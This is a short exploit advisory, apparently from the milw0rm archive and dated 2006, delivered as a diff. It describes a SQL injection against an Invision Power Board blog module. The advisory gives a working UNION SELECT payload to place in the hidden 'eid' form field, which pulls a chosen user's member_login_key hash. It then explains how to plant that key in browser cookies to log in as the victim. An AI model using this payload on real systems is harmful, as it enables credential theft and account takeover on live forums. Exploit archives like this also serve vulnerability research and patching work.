@@ -1,0 +1,19 @@
+1. Open any blog entry
+2. Try to reply to any message
+3. Push "Preview message" button (Do not post your reply)
+4. Save source code of opened page to your PC
+5. Find this string <input type='hidden' name='eid' value='<BLOG_ENTRY_ID>' />
+
+6. Change <BLOG_ENTRY_ID> with this SQL Injection:
+
+<BLOG_ENTRY_ID> UNION  SELECT b.entry_id,  b.blog_id, b.category_id, b.entry_author_id, b.entry_author_name, b.entry_date, member_login_key, b.entry_category, b.entry, b.entry_status, b.entry_locked, b.entry_num_comments, b.entry_last_comment, b.entry_last_comment_date, b.entry_last_comment_name, b.entry_last_comment_mid, b.entry_queued_comments, b.entry_has_attach, b.entry_post_key, b.entry_edit_time, b.entry_edit_name, b.entry_html_state, b.entry_use_emo, b.entry_trackbacks, b.entry_sent_trackbacks, b.entry_last_update, b.entry_gallery_album, b.entry_poll_state, b.entry_last_vote FROM ibf_members, ipb_blog_entries b WHERE id=<USER_ID> and b.entry_id=<BLOG_ENTRY_ID> LIMIT 1,1
+
+<USER_ID> - ID of the user whom password you want to get.
+
+7. Push "Preview Button" again.
+
+8. After refresh instead of blog entry name you will get users's HASH password.
+
+9. Change your cookies in your favorite browser and open board. You will be automaticaly logged in as the user whom password you just got.
+
+# milw0rm.com [2006-12-01]
